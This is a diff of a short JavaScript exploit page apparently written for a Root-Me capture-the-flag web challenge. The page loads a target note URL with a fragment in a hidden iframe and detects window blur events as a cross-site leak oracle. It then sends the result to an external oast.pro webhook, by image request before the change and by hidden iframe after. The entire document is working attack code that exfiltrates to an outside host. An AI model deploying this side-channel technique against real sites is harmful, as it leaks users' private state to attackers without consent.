@@ -1,23 +1,20 @@
 <script>
-  const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/1352";
-  const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
+const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/1367";
+const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
 
-  window.onload = () => {
+window.onload = function () {
     let blurFired = false;
-
-    window.addEventListener("blur", () => {
-      blurFired = true;
-    });
-
+    window.addEventListener("blur", () => { blurFired = true; });
     const iframe = document.createElement("iframe");
     iframe.src = TARGET + "#search_note";
     iframe.style.display = "none";
     document.body.appendChild(iframe);
-
     setTimeout(() => {
-      const result = blurFired ? "pro" : "no_pro";
-      const img = new Image();
-      img.src = `${WEBHOOK}?result=${result}`;
+        const result = blurFired ? "pro" : "no_pro";
+        const ex = document.createElement("iframe");
+        ex.src = WEBHOOK + "?result=" + result;
+        ex.style.display = "none";
+        document.body.appendChild(ex);
     }, 1000);
-  };
+};
 </script>
